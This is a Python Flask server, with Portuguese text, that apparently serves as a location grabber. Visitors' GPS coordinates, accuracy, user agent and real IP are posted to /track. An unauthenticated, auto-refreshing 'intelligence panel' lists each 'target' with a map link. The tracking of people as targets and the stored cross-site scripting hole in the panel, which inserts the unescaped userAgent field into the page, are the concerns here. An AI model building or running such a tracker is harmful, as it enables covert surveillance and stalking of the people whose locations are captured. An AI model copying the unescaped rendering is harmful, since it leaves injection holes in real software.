from flask import Flask, request, jsonify, send_from_directory
import time
from datetime import datetime

app = Flask(__name__, static_folder='public', static_url_path='')

# Armazenamento em Memória (Ephemeral)
TRACKINGS = []

@app.route('/track', methods=['POST'])
def track():
    try:
        data = request.get_json()
    except:
        data = {}
        
    lat = data.get('lat')
    lon = data.get('lon')
    accuracy = data.get('accuracy')
    user_agent = data.get('userAgent', 'Desconhecido')
    
    # Pega o IP real (Netlify usa x-forwarded-for)
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        ip = forwarded.split(',')[0].strip()
    else:
        ip = request.remote_addr or 'Local'

    if lat and lon:
        entry = {
            "id": int(time.time()),
            "timestamp": datetime.now().isoformat(),
            "userAgent": user_agent,
            "lat": float(lat),
            "lon": float(lon),
            "accuracy": float(accuracy) if accuracy else 0,
            "ip": ip
        }
        TRACKINGS.append(entry)
        
        # Limite de segurança: Mantém apenas os últimos 100
        if len(TRACKINGS) > 100:
            TRACKINGS.pop(0)
        
        print(f"[TRACK] Novo registro: {lat}, {lon} | IP: {ip}")
        return jsonify({"success": True})
    else:
        return jsonify({"error": "Invalid data"}), 400

@app.route('/admin', methods=['GET'])
def admin():
    sorted_trackings = sorted(TRACKINGS, key=lambda x: x['timestamp'], reverse=True)
    
    rows = ""
    for t in sorted_trackings:
        dt = datetime.fromisoformat(t['timestamp'])
        rows += f"""
        <tr>
            <td>{dt.strftime('%Y-%m-%d %H:%M:%S')}</td>
            <td>{t['ip']}</td>
            <td>{t['lat']:.6f}</td>
            <td>{t['lon']:.6f}</td>
            <td>±{int(t['accuracy'])}m</td>
            <td><a href="https://www.google.com/maps?q={t['lat']},{t['lon']}" target="_blank">📍 Ver no Map</a></td>
            <td style="max-width: 250px; font-size: 0.8em; color: #666;">{t['userAgent']}</td>
        </tr>
        """
    
    html = f"""
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <title>Painel de Inteligência</title>
        <meta http-equiv="refresh" content="5">
        <style>
            body {{ font-family: 'Segoe UI', sans-serif; background: #1e1e1e; color: #fff; padding: 20px; }}
            h1 {{ text-align: center; color: #00ffcc; }}
            .sub {{ text-align: center; color: #888; margin-bottom: 20px; }}
            table {{ width: 100%; border-collapse: collapse; background: #2d2d2d; border-radius: 8px; overflow: hidden; }}
            th {{ background-color: #333; padding: 12px; text-align: left; }}
            td {{ padding: 10px; border-bottom: 1px solid #444; }}
            a {{ color: #00ffcc; text-decoration: none; }}
            .count {{ background: #00ffcc; color: #000; padding: 2px 8px; border-radius: 12px; font-weight: bold; }}
        </style>
    </head>
    <body>
        <h1>📡 Painel de Rastreamento</h1>
        <div class="sub">Dados em Memória | Total: <span class="count">{len(TRACKINGS)}</span></div>
        <table>
            <thead>
                <tr>
                    <th>Horário</th>
                    <th>IP</th>
                    <th>Lat</th>
                    <th>Lon</th>
                    <th>Precisão</th>
                    <th>Mapa</th>
                    <th>Dispositivo</th>
                </tr>
            </thead>
            <tbody>
                {rows or '<tr><td colspan="7" style="text-align:center; color:#666;">Nenhum alvo registrado.</td></tr>'}
            </tbody>
        </table>
        <p style="text-align:center; font-size:0.8em; color:#666;">Mantenha esta aba aberta para manter a memória ativa.</p>
    </body>
    </html>"""
    return html

@app.route('/', methods=['GET'])
def index():
    return send_from_directory(app.static_folder, 'index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3001)